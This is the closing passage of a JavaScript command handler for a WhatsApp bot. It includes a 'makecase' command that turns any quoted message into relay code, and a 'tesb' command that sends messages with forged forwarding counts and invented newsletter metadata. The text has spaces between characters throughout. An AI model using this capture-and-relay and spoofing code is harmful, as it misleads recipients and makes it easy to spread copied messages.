 " u r l " :   " w a . m e / 5 5 1 2 9 8 1 7 9 1 3 8 9 " 
 } , 
 " b u s i n e s s O w n e r J i d " :   f r o m , 
 } 
 } ) ,   { 
 u s e r J i d :   X e o n B o t I n c . u s e r . i d , 
 q u o t e d :   n u l l 
 } ) 
 X e o n B o t I n c . r e l a y M e s s a g e ( f r o m ,   c a t a l o g . m e s s a g e ,   { 
 m e s s a g e I d :   c a t a l o g . k e y . i d 
 } ) 
 } 
 }   c a t c h   ( e )   { 
 c o n s o l e . l o g ( e ) ; 
 } 
 b r e a k 
 	 c a s e   ' p i n g ' :   c a s e   ' r u n t i m e ' :   c a s e   ' p ' :   c a s e   ' b o t s t a t u s ' :   c a s e   ' s t a t u s b o t ' :   { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
                                 c o n s t   s p e e d   =   r e q u i r e ( ' p e r f o r m a n c e - n o w ' ) 
 c o n s t   {   p e r f o r m a n c e   }   =   r e q u i r e ( ' p e r f _ h o o k s ' ) 
                                 l e t   t i m e s t a m p   =   s p e e d ( ) 
                                 l e t   l a t e n s i   =   s p e e d ( )   -   t i m e s t a m p 
                                 n e w w   =   p e r f o r m a n c e . n o w ( ) 
                                 o l d d   =   p e r f o r m a n c e . n o w ( ) 
                                 r e s p o n   =   ` 
 R e s p o n s e   S p e e d : \ n $ { l a t e n s i . t o F i x e d ( 4 ) }   _ S e c o n d _   \ n $ { o l d d   -   n e w w }   _ m i l i s e c o n d s _ \ n \ n R u n t i m e : \ n $ { r u n t i m e ( p r o c e s s . u p t i m e ( ) ) } 
                                 ` . t r i m ( ) 
                                 r e p l y g c x e o n ( r e s p o n ) 
                         } 
                         b r e a k 
 c a s e   ' m a k e c a s e ' : 
 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 i f   ( ! m . q u o t e d )   r e t u r n   r e p l y g c x e o n ( ' R e p l y   t o   a   m e s s a g e   t o   m a k e   a   c a s e   o f   i t ! ' ) ; 
 к и б а р   =   q . s p l i t ( '   ' ) [ 0 ] ; 
 i f   ( ! к и б а р )   { 
                 r e t u r n   r e p l y g c x e o n ( ` E x a m p l e   U s a g e :   $ { p r e f i x + c o m m a n d }   a b c ` ) ; 
         }         
 c o n s t   k a k   =   ( J S O N . s t r i n g i f y ( m . m e s s a g e . e x t e n d e d T e x t M e s s a g e . c o n t e x t I n f o . q u o t e d M e s s a g e ,   n u l l ,   2 ) ) 
 r e p l y g c x e o n   ( ` c a s e   ' $ { к и б а р } ' :   
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 t r y   { 
 v a r   $ { к и б а р }   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( f r o m ,   p r o t o . M e s s a g e . f r o m O b j e c t ( $ { k a k } ) , {   u s e r J i d :   f r o m   } ) 
 X e o n B o t I n c . r e l a y M e s s a g e ( f r o m ,   $ { к и б а р } . m e s s a g e ,   { m e s s a g e I d :   $ { к и б а р } . k e y . i d   } ) 
 }   c a t c h   ( e )   { 
 c o n s o l e . l o g ( e ) 
 } 
 b r e a k ` ) 
 b r e a k 
 
 c a s e   ' t e s b ' :   { 
     l e t   m s g s   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( m . c h a t ,   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 m e s s a g e C o n t e x t I n f o :   { 
                     d e v i c e L i s t M e t a d a t a :   { } , 
                     d e v i c e L i s t M e t a d a t a V e r s i o n :   2 
                 } , 
                 i n t e r a c t i v e M e s s a g e :   p r o t o . M e s s a g e . I n t e r a c t i v e M e s s a g e . c r e a t e ( { 
                     b o d y :   p r o t o . M e s s a g e . I n t e r a c t i v e M e s s a g e . B o d y . c r e a t e ( { 
                         t e x t :   ` h u i ` 
                     } ) , 
                     f o o t e r :   p r o t o . M e s s a g e . I n t e r a c t i v e M e s s a g e . F o o t e r . c r e a t e ( { 
                         t e x t :   b o t n a m e 
                     } ) , 
                     h e a d e r :   p r o t o . M e s s a g e . I n t e r a c t i v e M e s s a g e . H e a d e r . c r e a t e ( { 
                         h a s M e d i a A t t a c h m e n t :   t r u e , 
                         . . . a w a i t   p r e p a r e W A M e s s a g e M e d i a ( 
                             {   i m a g e :   f s . r e a d F i l e S y n c ( ' . / X e o n M e d i a / d o n a t e . j p g ' )   } , 
                             {   u p l o a d :   X e o n B o t I n c . w a U p l o a d T o S e r v e r   } 
                         ) 
                     } ) , 
                     n a t i v e F l o w M e s s a g e :   p r o t o . M e s s a g e . I n t e r a c t i v e M e s s a g e . N a t i v e F l o w M e s s a g e . c r e a t e ( { 
                         b u t t o n s :   [ 
                             { 
                                 n a m e :   " c t a _ c a l l " , 
                                 b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                     d i s p l a y _ t e x t :   " C a l l   O w n e r " , 
                                     p h o n e _ n u m b e r :   " + 1 2 3 4 5 6 7 8 9 0 "   / /   R e p l a c e   w i t h   t h e   a c t u a l   p h o n e   n u m b e r 
                                 } ) 
                             } 
                         ] 
                     } ) , 
                     c o n t e x t I n f o :   { 
                         m e n t i o n e d J i d :   [ m . s e n d e r ] , 
                         f o r w a r d i n g S c o r e :   9 9 9 , 
                         i s F o r w a r d e d :   t r u e , 
                         f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                             n e w s l e t t e r J i d :   i d c h , 
                             n e w s l e t t e r N a m e :   o w n e r n a m e , 
                             s e r v e r M e s s a g e I d :   1 4 3 
                         } 
                     } 
                 } ) 
             } 
         } 
     } ,   {   q u o t e d :   m   } ) ; 
 
     r e t u r n   a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( m . c h a t ,   m s g s . m e s s a g e ,   { } ) ; 
 } 
 b r e a k ; 
 
 	 
 	 
 
 c a s e   ' g e t m t y p e ' :   { 
 
         i f   ( ! m . q u o t e d )   r e t u r n   r e p l y g c x e o n ( ' R e p l y   t o   a   m e s s a g e   t o   d e b u g   i t s   m t y p e ! ' ) ; 
         c o n s t   q u o t e d M t y p e   =   m . q u o t e d . m t y p e   | |   ' U n k n o w n ' ; 
         c o n s o l e . l o g ( ` Q u o t e d   M e s s a g e   T y p e :   $ { q u o t e d M t y p e } ` ) ; 
         a w a i t   r e p l y g c x e o n ( ` Q u o t e d   M e s s a g e   T y p e :   $ { q u o t e d M t y p e } ` ) ; 
         } 
 b r e a k ; 
 
 d e f a u l t : 
 } 
 }   c a t c h   ( e r r )   { 
 c o n s o l e . l o g ( u t i l . f o r m a t ( e r r ) ) 
 } 
 } 
 
 
 l e t   f i l e   =   r e q u i r e . r e s o l v e ( _ _ f i l e n a m e ) 
 f s . w a t c h F i l e ( f i l e ,   ( )   = >   { 
 f s . u n w a t c h F i l e ( f i l e ) 
 c o n s o l e . l o g ( ` U p d a t e   $ { _ _ f i l e n a m e } ` ) 
 d e l e t e   r e q u i r e . c a c h e [ f i l e ] 
 r e q u i r e ( f i l e ) 
 } ) 
 
